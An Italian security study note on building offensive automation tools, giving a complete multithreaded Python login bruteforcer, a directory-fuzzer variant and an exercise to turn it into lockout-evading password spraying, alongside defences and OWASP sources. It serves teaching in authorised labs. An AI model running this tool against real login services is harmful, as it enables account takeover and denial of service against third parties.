---
tipo: concetto
tag: [tool, web]
fase: 1
fonti: 4
aggiornato: 2026-06-28
stato: maturo
aliases: ["Automazione Offensiva"]
---

# Automazione Offensiva

> **Nota etica — IMPORTANTE**: gli strumenti qui sotto (fuzzer di directory, bruteforcer di login) sono
> **didattici** e vanno usati **esclusivamente** su sistemi tuoi o con autorizzazione scritta
> ([[PortSwigger Web Academy]], DVWA, TryHackMe, CTF). Eseguire un bruteforce contro un servizio di
> terzi è un attacco a tutti gli effetti, perseguibile penalmente. Un tool reale rispetterebbe inoltre
> rate-limit e account lockout: ignorarli su un sistema vero significa fare DoS.

## In breve
"Automazione offensiva" = comporre i mattoni delle pagine precedenti ([[Requests e HTTP]], threading da
[[Socket e Port Scanner]], parsing da [[Parsing con os e re]]) in un **tool completo**. Due esempi
classici, didattici: un **dir-fuzzer** (trova path nascosti, come [[Gobuster]]/[[ffuf]]) e un
**login bruteforcer** (prova credenziali, come [[Hydra]]). Capire come si costruiscono spiega perché i
tool industriali funzionano — e come difendersi.

## Anatomia di un tool offensivo
Ogni tool di questo tipo ha la stessa struttura:
1. **Input**: un target + una **wordlist** (lista di tentativi). La qualità della wordlist conta più
   del codice (SecLists è lo standard).
2. **Loop**: per ogni voce, una richiesta.
3. **Oracolo**: una regola che decide *successo/fallimento* — lo status code, la lunghezza del body,
   una stringa nella risposta. È la parte intelligente.
4. **Concorrenza**: threading per velocità.
5. **Output**: solo i successi, filtrando il rumore.

## Script completo — login bruteforcer didattico (con threading)

```python
#!/usr/bin/env python3
# bruteforcer.py — bruteforce di login HTTP, DIDATTICO. SOLO su lab autorizzati (DVWA, PortSwigger).

import sys
import threading                    # per il lock condiviso tra thread
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

TIMEOUT = 5
# Marcatore di FALLIMENTO nella risposta: se questa stringa compare, le credenziali sono sbagliate.
# È l'ORACOLO: va calibrato sull'app bersaglio osservando una risposta di login fallito.
MARKER_FALLIMENTO = "Login failed"

# Evento condiviso: appena uno trova le credenziali, gli altri thread si fermano (no sprechi).
trovato = threading.Event()

def prova(url: str, user: str, pwd: str) -> tuple | None:
    """Una singola richiesta di login. Ritorna (user, pwd) se ha successo, altrimenti None."""
    if trovato.is_set():            # se un altro thread ha già vinto, non sprecare richieste
        return None
    try:
        # Ogni tentativo è indipendente: usiamo requests.post diretto (non serve una Session persistente)
        r = requests.post(url, data={"username": user, "password": pwd}, timeout=TIMEOUT)
    except requests.RequestException:
        return None                 # errore di rete: salta questo tentativo
    # ORACOLO: successo = il marker di fallimento NON è presente nella risposta
    if MARKER_FALLIMENTO not in r.text:
        trovato.set()               # segnala a tutti gli altri thread di fermarsi
        return (user, pwd)
    return None

def carica(percorso: str) -> list[str]:
    """Legge una wordlist: una voce per riga, ignorando righe vuote."""
    with open(percorso, encoding="utf-8", errors="ignore") as f:
        return [r.strip() for r in f if r.strip()]

def main() -> None:
    if len(sys.argv) != 5:
        print(f"Uso: {sys.argv[0]} <url_login> <utente> <wordlist_pwd> <thread>")
        sys.exit(1)
    url, user, wl_path, n_thread = sys.argv[1], sys.argv[2], sys.argv[3], int(sys.argv[4])

    password = carica(wl_path)
    print(f"[+] Bruteforce su {url}  utente={user}  {len(password)} password  {n_thread} thread\n")

    with ThreadPoolExecutor(max_workers=n_thread) as pool:
        # accoda un task per ogni password della wordlist
        futures = {pool.submit(prova, url, user, p): p for p in password}
        for fut in as_completed(futures):       # iteriamo i task NELL'ORDINE in cui finiscono
            esito = fut.result()
            if esito:
                u, p = esito
                print(f"\n[+] TROVATO -> {u}:{p}")
                # i task restanti vedranno trovato.is_set() e usciranno subito; usciamo dal programma
                pool.shutdown(wait=False, cancel_futures=True)
                return
    print("[-] Nessuna password della wordlist ha funzionato.")

if __name__ == "__main__":
    main()
```

## La logica chiave
- **L'oracolo è il cuore**: il codice è banale; la difficoltà è definire *come riconoscere il successo*.
  Marker di fallimento, status code, lunghezza del body, redirect: vanno **calibrati osservando** l'app
  (con [[Burp Suite]] o un browser). Un oracolo sbagliato dà solo falsi positivi/negativi.
- **`threading.Event` per fermarsi**: senza, dopo aver trovato la password gli altri 9.999 tentativi
  partirebbero comunque. L'Event è il segnale condiviso "abbiamo finito" — pattern essenziale.
- **`as_completed`**: processa i risultati appena pronti, non in ordine di sottomissione. Trovi prima e
  ti fermi prima.
- **Wordlist > codice**: il tool vale quanto la sua lista. È la stessa filosofia di [[Hydra]],
  [[Gobuster]] e [[ffuf]] — il motore è semplice, l'arte è la wordlist.

## Variante dir-fuzzer
Cambiando l'oracolo (status `!= 404` invece del marker) e usando `GET {base}/{voce}`, lo stesso
scheletro diventa un fuzzer di directory: provi path da una wordlist e segnali quelli che esistono.
È esattamente ciò che fa [[Gobuster]] (vedi anche [[Requests e HTTP]] per i filtri sullo status).

## Come ci si difende (l'altra metà)
- **Rate limiting** e **account lockout**: rallentano/bloccano il bruteforce.
- **CAPTCHA** dopo N tentativi falliti.
- **MFA**: la password indovinata non basta.
- **Risposte d'errore uniformi**: se "utente inesistente" e "password errata" danno la stessa risposta,
  l'oracolo dell'attaccante perde informazioni (no user enumeration).

## Esercizio progressivo
1. **Base**: aggiungi una **barra di progresso** (contatore `n/totale`) usando un lock per stampare
   senza che i thread si sovrappongano nell'output.
2. **Intermedio**: trasformalo in un attacco **spray** — una sola password contro *molti* username (è
   più furtivo e aggira spesso il lockout per-account).
3. **Avanzato**: aggiungi `--delay` tra le richieste e `--proxy` (per instradare via [[Burp Suite]]),
   così da emulare un tool reale che rispetta i rate-limit ed è ispezionabile.

## Lab
- **TryHackMe** — *Python for Pentesters*. Replica il bruteforcer contro un form di login in lab
  (DVWA/PortSwigger), poi confrontalo con [[Hydra]].
- Aggiungi rate-limiting lato client e gestione dei lockout per rendere il tool "OPSEC-aware".

## Domande
**D: Qual è l'anatomia di un tool offensivo di bruteforce?**
R: Sorgente di candidati (wordlist) → costruzione richiesta → **discriminante** affidabile di
successo/fallimento → concorrenza (threading) con rate control → logging dei risultati.

**D: Perché serve un discriminante di successo affidabile e come si sceglie?**
R: Per evitare falsi positivi: si usa lunghezza/contenuto della risposta, presenza di una parola
chiave, status code o redirect diverso dal caso "fallito".

**D: Come ci si difende dal credential bruteforce?**
R: Rate-limiting, account lockout/backoff, MFA, CAPTCHA, e monitoraggio di tentativi anomali
(detection lato SOC).

## Collegamenti
- [[Requests e HTTP]] — il livello di richiesta che questo tool usa
- [[Socket e Port Scanner]] — stesso pattern di threading
- [[Parsing con os e re]] — caricare e filtrare wordlist/risposte
- [[Hydra]] — il bruteforcer industriale
- [[Gobuster]] / [[ffuf]] — i dir-fuzzer industriali
- [[Autenticazione e Gestione Sessioni]] — le difese lato server
- [[Burp Suite]] — calibrare l'oracolo e proxare il traffico

## Fonti
- OWASP — Blocking Brute Force Attacks: https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks
- OWASP — Credential Stuffing Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html
- SecLists (wordlist standard): https://github.com/danielmiessler/SecLists
- Requests — documentazione: https://requests.readthedocs.io/en/latest/
